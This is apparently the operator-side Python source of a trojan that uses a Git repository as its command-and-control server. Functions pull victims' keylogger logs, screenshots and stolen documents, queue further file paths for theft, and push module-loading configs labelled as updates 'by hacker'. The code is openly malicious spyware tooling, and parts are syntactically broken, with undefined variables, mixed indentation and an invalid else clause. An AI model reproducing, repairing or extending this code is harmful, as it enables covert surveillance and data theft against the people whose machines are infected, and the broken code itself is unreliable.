
'''函数名：getFileDir
函数功能：获取某台木马端的文件路径
函数参数：rep，服务器的repository对象。m，要获取的mac地址。
算法说明：'''
def getFileDir(rep):
	if repo.contents("data/"+mac+"/doc/doc.txt") == None :
    #   print "ip"
        print "dont have such file"
    con = repo.contents("data/"+mac+"/doc/doc.txt")
    msg = base64.decodestring(str(con.content))
    return msg


'''函数名：downKeyboard
函数功能：获得键盘文件数据
函数参数：
算法说明：'''
def downKeyboard(rep):
	if repo.contents("data/"+mac+"/keyboard.txt") == None :
    #   print "ip"
        print "dont have such file"
    con = repo.contents("data/"+mac+"/keyboard.txt")
    msg = base64.decodestring(str(con.content))
    return msg

'''
函数名：downScreen
函数功能：获得截屏数据下载到本地
函数参数：
算法说明：
'''
def downScreen(rep,mac):
	if repo.contents("data/"+mac+"/screen.bmp") == None :
    #   print "ip"
        print "dont have such file"
    con = repo.contents("data/"+mac+"/screen.bmp")
    binmsg = base64.decodestring(str(con.content))
    fi = open("C:/temp/"+mac+".bmp","wb")
    fi.write(binmsg)
    fi.close()


def DelLastChar(str):
    str_list=list(str)
    str_list.pop()
    return "".join(str_list)  
'''
函数名：updateJSON
函数功能：更新配置文件
函数参数：
算法说明：
'''
def updateJSON(rep,modi):
	print "update"
	for (m,moli) in modi.items():
		#print "key:"+m+",value:"+moli	
		wr = "["
		for mo in moli:
			wr +="{\"module\":\""+mo+"\"}"
			wr +=","
		wr = DelLastChar(wr)
		wr += "]"
		print wr
		if rep.contents("config/"+m+".json") == None :
	#	init "mac"
			print "init"
			rep.create_file("config/"+str(m)+".json","update load module by hacker",wr)
		con = rep.contents("config/"+str(m)+".json")
		con.update("update load module by hacker",wr)


'''
函数名：addPath
函数功能：向服务器的文件请求path/mac.txt中添加一条想获得的文件路径
函数参数：
算法说明：
'''

def addPath(filepath):
	if rep.contents("path/"+pcname+".txt") == None :
	#	print "ip"
		rep.create_file("path/"+pcname+".txt",pcname +"addPath autosave file create",filepath+"\n")
	con = rep.contents("path/"+pcname+".txt")
	msg = base64.decodestring(str(con.content))	
	con.update("update hack's ip automatically from py",msg+filepath+"\n")


'''
函数名：delPath
函数功能：向服务器的文件请求path/mac.txt中删除一条已经获得的文件路径
函数参数：
算法说明：
'''
def delPath(filepath):
	if rep.contents("path/"+pcname+".txt") == None :
		print "dont have such file"
		return
	con = rep.contents("path/"+pcname+".txt")
	msg = base64.decodestring(str(con.content))	
	if msg.find(filepath+"\n")==-1:
		print "the file log must have been verified"
	else :
		msg=msg.replace(filepath+"\n","")
	con.update("delPath from py",msg)


'''
函数名：ifHaveFile
函数功能：检查服务器上是否有想获得的文件，如果有就准备下载
函数参数：filename，想获得的文件的文件名
算法说明：
'''
def ifHaveFile(filename,rep,mac)
	if rep.contents("data/" + mac + "/doc/"+filename) == None :
		print "dont have such file"
		return
	else(filename,rep,mac)



'''
函数名：downFile
函数功能：从服务器下载文件
函数参数：
算法说明：
'''
def downFile(filename,rep,mac):
    global mac

    #print repo
    #filename="keyboard.txt"

    filename=str(filename)
    #print(type(filename))
    if (repo.contents("data/" + mac + "/doc/"+filename) == None):
        #	init "mac"
        print "data/" + str(mac)  + "/doc/"+filename
        print "dont have such file... please wait for trojan uploading..."
        return "error"

    print "data/" + str(mac) +  "/doc/"+filename
    con = repo.contents("data/" + str(mac) + "/doc/" +filename)
    binstr = base64.decodestring(str(con.content))
    print len(binstr)
    print binstr
    filename = filename.split('\\')[-1]

    fileHandle = open("C:\\temp\\"+filename, 'wb')
    fileHandle.write(binstr)
    fileHandle.close()
    #	rep.update_file("data/"+str(m)+"/doc/doc.txt", "upload dir", searchFileDir(), sha)
    print "download ok"
